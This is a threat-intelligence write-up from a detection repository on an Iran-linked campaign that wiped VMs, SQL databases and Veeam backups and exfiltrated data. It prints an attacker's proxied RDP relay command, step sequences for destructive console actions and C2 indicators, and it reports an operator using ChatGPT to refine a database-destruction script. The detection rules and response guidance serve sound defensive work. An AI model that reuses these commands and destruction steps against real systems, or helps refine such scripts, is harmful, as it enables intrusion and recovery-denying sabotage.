---
date: 2026-05-31
title: "Black Shadow / Ababil of Minab — Iran-MOIS recovery-layer destruction: vCenter VM deletion, Veeam backup wipe, SSMS database drops to deny recovery"
clusters: ["Black Shadow (Ababil of Minab persona)"]
cluster_country: "Iran (MOIS nexus)"
techniques_enterprise: [T1078, T1133, T1021.001, T1090.003, T1572, T1059.006, T1485, T1561.001, T1561.002, T1490, T1529, T1588.007, T1041]
techniques_ics: []
platforms: [windows, linux, network-edge]
sectors: [transportation, media, insurance, education, government]
---

# Black Shadow / Ababil of Minab — Iran-MOIS recovery-layer destruction: vCenter VM deletion, Veeam backup wipe, SSMS database drops to deny recovery

## TL;DR

Gambit Security (report 2026-05-26) tied the pro-Iranian "Ababil of Minab" persona
— which publicly claimed the Los Angeles County Metropolitan Transportation
Authority (LA Metro / LACMTA) breach confirmed 2026-04-02 — to **Black Shadow**,
an Iran Ministry of Intelligence and Security (MOIS) cluster previously named by
Israel's National Cyber Directorate. The campaign exfiltrated data from
organizations in the US, Israel, Saudi Arabia and Turkey (transportation, media,
insurance, education, digital services) and, at a subset, executed a deliberate
**recovery-layer destruction** playbook: deleting virtual machines through
authenticated vCenter sessions, dropping and deleting SQL databases through SSMS,
wiping disk volumes through Disk Management, secure-erasing web roots and backup
directories with WipeFile, and deleting the Veeam backup chain from the
repository. Destruction ran both as scripted automation (iterate an inventory,
issue the destructive command per entry) and hands-on-keyboard through the same
consoles a legitimate admin uses; in one intrusion the operator used ChatGPT to
refine a Python database-destruction script to spare system databases. The
why-today: it is the first repo primary on **recovery-layer / backup destruction
(slot #30)**, the tradecraft is living-off-the-land against virtualization and
backup planes (low malware, high impact), and the operator front is active across
multiple countries with named C2 infrastructure to retro-hunt now.

## Attribution and confidence

| Attribute | Detail |
| --- | --- |
| Primary cluster | Black Shadow (Iran-MOIS) operating behind the "Ababil of Minab" hacktivist persona |
| Confidence | high (Black Shadow / Iran-MOIS nexus — Gambit + INCD + ClearSky + Simon Kenin); medium (persona-to-cluster equivalence rests on infrastructure overlap) |
| Vendor discovery | Gambit Security "Attacking the recovery layer: an Iran-MOIS case study" (Eyal Sela, Nir Varon, 2026-05-26); Industrial Cyber coverage 2026-05-29; corroboration from ClearSky Cyber Security and researcher Simon Kenin |
| Geographic nexus | Iran (MOIS); victims in the US, Israel, Saudi Arabia, Turkey |
| Motivation | Geopolitical sabotage + influence — data theft for leak/extortion leverage plus recovery-denial destruction at chosen victims |

### Cluster overlap and aliasing

| Source | Name | Notes |
| --- | --- | --- |
| Self-branded persona | Ababil of Minab | Pro-Iranian "hacktivist" front; claimed LA Metro; assessed by Gambit as not a new standalone crew |
| INCD (Israel) | Black Shadow | Previously attributed to Iran's MOIS; INCD took down a related site 2025-08-28 |
| Gambit / ClearSky / S. Kenin | Black Shadow ↔ Ababil of Minab | Infrastructure + tooling overlap (customized Go tunneler, staging server) links the persona to Black Shadow |

### Repo genealogy

- First repo primary in slot **#30 (backup / DR / hypervisor / recovery-layer destruction)**; opens `byTechnique/t1490/` (Inhibit System Recovery) and `byTechnique/t1561/` as hubs.
- Cross-link with **Day 4** (C0063 Poland wiper) and **Day 1** (VECT/ wiper-class) on data destruction, but here destruction is LOLBin against the *virtualization and backup planes*, not a wiper binary.
- Cross-link with the AI-misuse thread (Days 31/33 and the Gambit AI campaign): here the AI role is narrow — ChatGPT used to refine a destruction script — reinforcing "AI compresses operator skill" without novel malware.
- Iran-MOIS state-nexus places it alongside espionage-class cases while the impact is destructive.

## Kill chain — summary table

| Stage | MITRE | Detail |
| --- | --- | --- |
| Access via valid accounts / remote services | T1078, T1133 | Authenticated access into vCenter, RDP and management consoles; proxied entry |
| Proxied RDP + multi-hop relay | T1021.001, T1090.003 | `proxychains` + `xfreerdp` relayed through `91.193.19.198:8443` into an IIS host (SFRTA) |
| Tunneling / C2 | T1572 | Custom Go tunneler "A.ExE" beaconing to `members.nefeshhope[.]com` / `46.30.190.173` |
| Virtualization destruction | T1485, T1529 | Authenticated vCenter session: VM Power Off then Delete from Disk (Recent Tasks 2026-03-16 11:52:38) |
| Disk / volume destruction | T1561.001, T1561.002 | Disk Management Delete Volume / format on guest hosts; new volume relabeled "Minab" |
| Database destruction | T1485, T1059.006 | SSMS Take Offline + Drop All Active Connections + Delete Object; Python scripts dropped 58 SQL Server targets (ChatGPT-refined to spare system DBs) |
| Backup / recovery denial | T1490 | WipeFile secure-erase of web roots + SQLBackup; Veeam Backup & Replication "Delete from disk" removing the backup chain |
| Exfiltration | T1041 | Custom exfil tooling; staged stolen files via `31.172.87.20`; ≥700 GB from LACMTA |

![Black Shadow recovery-layer destruction kill chain](./kill_chain.svg)

The left lane is the victim estate (IT, virtualization, database and backup
planes); the right lane is the Black Shadow operator working through legitimate
consoles and a Go tunneler. Critical (red) nodes mark the three recovery-denial
moves — VM Delete-from-Disk, SSMS database deletion, and Veeam backup-chain
deletion — which are the highest-value detection anchors because each blocks a
different restoration path.

## Stage-by-stage detail

### Access and proxied remote services — T1078 / T1133 / T1021.001 / T1090.003

Gambit observed proxied RDP into the South Florida Regional Transportation
Authority (SFRTA): a screencast showed `proxychains` wrapping `xfreerdp` relayed
through an attacker node, landing an interactive session on an IIS host with
local-administrator access to IIS Manager, SQL Server Management Studio, the
local file system and an outbound FileZilla FTP client.

```bash
# Reconstructed from the operator's own screencast (SFRTA)
proxychains xfreerdp /v:<iis_host> /u:<localadmin> /relay:91.193.19.198:8443
```

### Tunneling and C2 — T1572

A customized build of a public Go tunneler, tracked by Gambit as **A.ExE**,
provided tunneling/C2. The hostname `members.nefeshhope[.]com` resolved to
`46.30.190.173` and served as C2; additional tunneler samples were served from
`45.150.108.61`, infrastructure tied to Black Shadow.

```text
A.ExE            customized public Go tunneler (truncated SHA256 f6db77b)
C2               members.nefeshhope[.]com -> 46.30.190.173
tunneler infra   45.150.108.61 (served samples 1c69972, 38965a6)
```

### Virtualization destruction — T1485 / T1529

At LA Metro the operator worked inside an **authenticated vCenter session**,
selected a virtual machine and issued **Power Off** followed by **Delete from
Disk**. Both actions went through the vCenter task queue and were logged in the
Recent Tasks pane at `2026-03-16 11:52:38`; the action removed the VM and its
underlying disk files from the datastore. Hours later LA Metro publicly reported
TAP fare-loading and service-alert outages.

```text
vCenter > VM > Power Off
vCenter > VM > Delete from Disk   (Recent Tasks: 03/16/2026 11:52:38)
```

### Disk and volume destruction — T1561.001 / T1561.002

On Windows guests the operator opened Computer Management → Disk Management,
enumerated volumes and used **Delete Volume**, acknowledging the OS warnings. At
UNIMAC the sequence was format → Delete Volume → create a new volume named
**"Minab"** in place of the deleted partition (a persona signature).

### Database destruction — T1485 / T1059.006

Through SQL Server Management Studio the operator issued **Take Database Offline**
with **Drop All Active Connections**, then **Delete Object** per database. In the
Vyncs intrusion, custom **Python** scripts enumerated and deleted databases
across **58 SQL Server targets** while removing backup files; forensics showed the
operator used **ChatGPT to refine the destruction script** to exclude protected
system databases and focus on user/application databases.

### Backup and recovery denial — T1490

The defining move. **WipeFile** (a Windows secure-deletion utility) overwrote
hosting trees including hosted sites and the **SQLBackup** directory. The operator
then opened the **Veeam Backup & Replication** console and issued **Delete from
disk** against the Veeam backup inventory — which, per Veeam documentation,
permanently removes the entire backup chain at the repository file level. Combined
with VM and volume deletion, this forces three separate, parallel restoration
processes and maximizes downtime.

### Exfiltration — T1041

Custom exfiltration tooling moved data out; at least **700 GB** of emails,
backups and files were taken from LACMTA. On the operator's staging server,
investigators found stolen files transferred from `31.172.87.20`, further linking
the activity to prior Iran-linked operations. Gambit also found additional,
unexposed victims (Israeli media and higher-education, a Turkish insurance
brokerage) where only exfiltration — not destruction — was observed.

## Detection strategy

### Telemetry that matters

- **Virtualization (vCenter/ESXi)**: vpxd/`vcenter` events and the Recent Tasks
  audit — `Destroy_Task`, `PowerOffVM_Task`, datastore file deletions; vCenter
  SSO logins from unusual sources. Forward vCenter events to the SIEM.
- **Backup plane (Veeam)**: Veeam B&R job/audit logs and the Veeam SQL/config DB —
  "Delete from disk" / repository deletions, and Windows Security 4688/Sysmon 1
  for `Veeam.Backup.*` console actions outside change windows.
- **Database (SQL Server)**: SQL Server Audit / error log for `ALTER DATABASE ...
  SET OFFLINE`, `DROP DATABASE`, mass connection kills; Windows process creation
  for `Ssms.exe`/`sqlcmd` from non-DBA hosts.
- **Windows hosts**: Sysmon EID 1 for `WipeFile`, `diskpart`, `format`, volume
  deletions; EID 3 for tunneler egress; Security 4688/4663 on `SQLBackup` paths.
- **Attacker host / Linux**: `proxychains` + `xfreerdp` process creation.

### Detection coverage

| Engine | File | Logic |
| --- | --- | --- |
| Sigma | `sigma/01_blackshadow_wipefile_secure_delete.yml` | process_creation: `WipeFile` / secure-delete utility execution against web/backup paths (T1490/T1485) |
| Sigma | `sigma/02_blackshadow_veeam_backup_deletion.yml` | process_creation/image_load: Veeam console/PowerShell issuing repository "delete from disk" / `Remove-VBR*` (T1490) |
| Sigma | `sigma/03_blackshadow_proxychains_xfreerdp.yml` | process_creation: `proxychains` wrapping `xfreerdp`/`rdp` multi-hop relay (T1090.003/T1021.001) |
| KQL | `kql/k1_blackshadow_vcenter_vm_destroy.kql` | Syslog (vCenter): `Destroy_Task`/`PowerOffVM_Task` bursts from one principal (T1485) |
| KQL | `kql/k2_blackshadow_sql_offline_drop.kql` | DeviceProcessEvents/Syslog: `SET OFFLINE` + `DROP DATABASE` / SSMS from non-DBA host (T1485) |
| KQL | `kql/k3_blackshadow_wipefile_veeam_delete.kql` | DeviceProcessEvents: WipeFile and Veeam delete-from-disk console actions (T1490) |
| KQL | `kql/k4_blackshadow_tunneler_c2_egress.kql` | DeviceNetworkEvents: egress to the A.ExE C2 / tunneler infrastructure (T1572) |
| YARA | `yara/blackshadow_go_tunneler.yar` | Customized Go tunneler "A.ExE" markers + Minab/persona strings |
| Suricata | `suricata/blackshadow_c2.rules` | DNS/TLS/HTTP to `members.nefeshhope[.]com` and tunneler infra IPs |

No SPL is emitted (retired repo-wide 2026-05-11). Convert Sigma with
`sigma convert -t splunk -p sysmon <rule>.yml` if needed.

### Threat hunting hypotheses

- **H1 (`hunts/peak_h1_recovery_layer_deletion_burst.md`)** — If recovery-layer
  destruction ran, a single principal issued a burst of VM/volume/database/backup
  deletions across the virtualization, DB and Veeam planes in a short window.
- **H2 (`hunts/peak_h2_veeam_wipefile_backup_destruction.md`)** — If backups were
  denied, WipeFile or a Veeam "delete from disk" touched the SQLBackup/repository
  outside any sanctioned retention job.
- **H3 (`hunts/peak_h3_proxied_rdp_tunneler.md`)** — If proxied access was used,
  an interactive RDP session arrived via a multi-hop relay and a Go tunneler beacon
  is present on the same host.

## Incident response playbook

### First 60 minutes (triage)

1. Treat as **destructive, recovery-targeting** — immediately verify the integrity
   and isolation of backups (Veeam repositories, immutable/offsite copies) before
   anything else; assume the adversary tried to delete them.
2. Pull vCenter Recent Tasks / events for `Destroy_Task` and `PowerOffVM_Task`;
   identify the principal, source IP and time window; disable that account.
3. Snapshot/preserve surviving datastores and any orphaned VMDKs before cleanup.
4. Pull SQL Server logs for `SET OFFLINE` / `DROP DATABASE` and identify dropped
   databases and the host that issued them.
5. Hunt the tunneler C2 (`members.nefeshhope[.]com`, `46.30.190.173`,
   `45.150.108.61`, `91.193.19.198`, `31.172.87.20`) across egress and isolate
   beaconing hosts.

### Artifacts to collect

| Artifact | Path | Tool | Why |
| --- | --- | --- | --- |
| vCenter events | vpxd logs / vCenter events DB | govc / SIEM | Proves VM Power Off + Delete-from-Disk and the actor principal |
| Veeam audit | Veeam B&R config DB / `%ProgramData%\Veeam\Backup` logs | Veeam logs | Proves repository "delete from disk" |
| SQL Server logs | SQL error log / Audit | SSMS / `sqlcmd` | Proves offline/drop and timing |
| Process creation | Sysmon-Operational / DeviceProcessEvents | EvtxECmd / KQL | WipeFile, diskpart/format, proxychains/xfreerdp |
| Web/backup tree | IIS root, `SQLBackup\` | triage | WipeFile secure-erase evidence |

### IR queries and commands

```powershell
# Veeam repository deletions in the last 30 days (Windows Security 4688 / Sysmon 1)
Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Sysmon/Operational'; Id=1 } |
  Where-Object { $_.Message -match 'Veeam' -and $_.Message -match '(Remove-VBR|delete)' } |
  Select-Object TimeCreated, Message
```

```bash
# vCenter destroy/poweroff tasks from forwarded syslog (attacker principal + window)
grep -E 'Destroy_Task|PowerOffVM_Task' /var/log/vmware/vcenter-*.log | \
  awk '{print $1,$2,$NF}' | sort | uniq -c | sort -rn | head
```

```kql
// SQL database destruction (Sentinel Syslog from SQL audit forwarding)
Syslog
| where TimeGenerated > ago(30d)
| where SyslogMessage has_any ("SET OFFLINE", "DROP DATABASE", "Drop All Active Connections")
| project TimeGenerated, HostName, SyslogMessage
| order by TimeGenerated desc
```

### Containment, eradication, recovery

- **Exit criteria**: attacker principals disabled and rotated; vCenter/Veeam/SQL
  admin restricted to MFA + jump host; backup immutability/offsite confirmed
  intact; tunneler C2 blocked and beaconing hosts reimaged; recovery validated
  against an adversarial (not just hardware-failure) scenario.
- **What NOT to do**: do not reuse the same Veeam repository/credentials until
  proven uncompromised; do not assume a "deleted" VM is unrecoverable before
  checking datastore orphans and offsite copies; do not restore into an
  environment where the actor still holds valid vCenter/AD credentials.

### Recovery validation

- Confirm at least one **isolated, immutable** backup copy survived and restores
  cleanly end-to-end.
- Re-test that vCenter, Veeam and SQL admin planes require MFA and are unreachable
  from general user subnets.
- Validate recovery time against the *combined* destruction scenario (VM + volume
  + DB + backup), since the operator deliberately ran them in parallel.

## IOCs

| Type | Value | Context | Confidence | Source |
| --- | --- | --- | --- | --- |
| domain | members.nefeshhope[.]com | C2 hostname for the A.ExE Go tunneler | high | Gambit |
| ipv4 | 46.30.190.173 | C2 IP that members.nefeshhope[.]com resolved to | high | Gambit |
| ipv4 | 45.150.108.61 | Served customized Go tunneler samples; Black Shadow infra | high | Gambit |
| ipv4 | 91.193.19.198 | Proxied RDP relay (port 8443) into SFRTA | high | Gambit |
| ipv4 | 31.172.87.20 | Source server for stolen files staged on operator infrastructure | high | Gambit |
| string | A.ExE | Customized public Go tunneler tracked by Gambit | medium | Gambit |
| string | Minab | New volume name left in place of deleted partitions (persona signature) | medium | Gambit |
| string | WipeFile | Secure file-deletion utility used to erase web roots and SQLBackup | medium | Gambit |
| note | Truncated SHA256 prefixes from the report: A.ExE f6db77b; tunneler samples 1c69972 and 38965a6 (full hashes not published in the coverage reviewed) | high | Gambit |
| note | Destruction ran both scripted (inventory iteration) and hands-on-keyboard via vCenter/SSMS/Disk Management/Veeam consoles; ChatGPT used to refine a Python DB-destruction script | high | Gambit |

Full machine-readable list in `iocs.csv`. Refresh value-based indicators before
blocking; anchor on the recovery-layer behaviors, which do not rotate.

## Secondary findings

- **Persona-as-cover** — "Ababil of Minab" presents as a standalone hacktivist
  crew, but Gambit assesses it as an Iran-MOIS (Black Shadow) operation; INCD took
  down related infrastructure on 2025-08-28. Treat hacktivist "claims" as possible
  state-cover and pivot on infrastructure overlap, not branding.
- **Unexposed victims** — Beyond the four named intrusions, Gambit found additional
  Israeli (media, higher education) and Turkish (insurance brokerage) victims on
  the staging server with exfiltration but no destruction — the public claims
  under-count the real victim set.
- **AI lowers the destruction bar** — The operator used ChatGPT to refine a
  database-destruction script (spare system DBs, target user DBs). No novel
  malware; the significance is skill compression, echoing the Dragos/Gambit AI
  findings — destructive operations are becoming accessible to less-skilled actors.

## Pedagogical anchors

- **Defend the recovery layer as a crown jewel.** Backups, vCenter and the Veeam
  console are now primary *targets*, not just safety nets. Immutable + isolated +
  MFA-gated backups, and recovery validated against an adversarial scenario, are
  what turn this attack from catastrophic into survivable.
- **Detect on destructive verbs, not malware.** The whole chain is living-off-the-
  land: vCenter Delete-from-Disk, SSMS DROP/Take-Offline, Disk Management Delete
  Volume, Veeam delete-from-disk, WipeFile. Anchor SIEM on those verbs across the
  virtualization/DB/backup planes.
- **Multiple destructive techniques = recovery-denial strategy.** Deleting VMs,
  volumes, databases and backups each forces a different restoration path; the
  combination is deliberate. IR must plan for parallel, compounding recovery.
- **Hacktivist branding can be state cover.** Pivot on infrastructure and tooling
  overlap (the Go tunneler, staging servers) before accepting a persona's
  self-attribution.

## What's in this folder

| File | Purpose |
| --- | --- |
| [README.md](./README.md) | This analysis (15 sections). |
| [kill_chain.svg](./kill_chain.svg) | Two-lane recovery-layer destruction diagram (template A, canonical palette). |
| [sigma/01_blackshadow_wipefile_secure_delete.yml](./sigma/01_blackshadow_wipefile_secure_delete.yml) | WipeFile / secure-delete against web + backup paths. |
| [sigma/02_blackshadow_veeam_backup_deletion.yml](./sigma/02_blackshadow_veeam_backup_deletion.yml) | Veeam repository "delete from disk" / Remove-VBR*. |
| [sigma/03_blackshadow_proxychains_xfreerdp.yml](./sigma/03_blackshadow_proxychains_xfreerdp.yml) | proxychains + xfreerdp multi-hop RDP relay. |
| [kql/k1_blackshadow_vcenter_vm_destroy.kql](./kql/k1_blackshadow_vcenter_vm_destroy.kql) | vCenter Destroy_Task / PowerOffVM_Task burst. |
| [kql/k2_blackshadow_sql_offline_drop.kql](./kql/k2_blackshadow_sql_offline_drop.kql) | SQL SET OFFLINE / DROP DATABASE from non-DBA host. |
| [kql/k3_blackshadow_wipefile_veeam_delete.kql](./kql/k3_blackshadow_wipefile_veeam_delete.kql) | WipeFile + Veeam delete-from-disk console actions. |
| [kql/k4_blackshadow_tunneler_c2_egress.kql](./kql/k4_blackshadow_tunneler_c2_egress.kql) | Egress to the A.ExE tunneler C2 / infra. |
| [yara/blackshadow_go_tunneler.yar](./yara/blackshadow_go_tunneler.yar) | Customized Go tunneler markers + persona strings. |
| [suricata/blackshadow_c2.rules](./suricata/blackshadow_c2.rules) | DNS/TLS/HTTP to the C2 domain + tunneler infra IPs. |
| [hunts/peak_h1_recovery_layer_deletion_burst.md](./hunts/peak_h1_recovery_layer_deletion_burst.md) | PEAK hunt — cross-plane deletion burst. |
| [hunts/peak_h2_veeam_wipefile_backup_destruction.md](./hunts/peak_h2_veeam_wipefile_backup_destruction.md) | PEAK hunt — backup destruction. |
| [hunts/peak_h3_proxied_rdp_tunneler.md](./hunts/peak_h3_proxied_rdp_tunneler.md) | PEAK hunt — proxied RDP + tunneler. |
| [iocs.csv](./iocs.csv) | Machine-readable indicators. |

## Sources

- [Attacking the recovery layer: an Iran-MOIS case study — Gambit Security](https://gambit.security/blog-posts/babil-of-minab-iran-mois-destruction-campaign)
- [Gambit links Iran-linked Black Shadow group to destructive cyber campaign — Industrial Cyber](https://industrialcyber.co/industrial-cyber-attacks/gambit-links-iran-linked-black-shadow-group-to-destructive-cyber-campaign-targeting-us-middle-east-organizations/)
- [Ababil of Minab claims cyberattack on LACMTA — Industrial Cyber](https://industrialcyber.co/industrial-cyber-attacks/ababil-of-minab-claims-cyberattack-on-lacmta-exposing-risks-to-rail-control-systems-and-critical-transit-infrastructure/)
- [Iranian-backed group behind attacks on transit systems in LA, South Florida — Security Boulevard](https://securityboulevard.com/2026/05/iranian-back-group-behind-attacks-on-transit-systems-in-la-south-florida/)
- [Veeam: Deleting Backups from Disk (documentation)](https://helpcenter.veeam.com/docs/backup/vsphere/delete_from_disk.html)
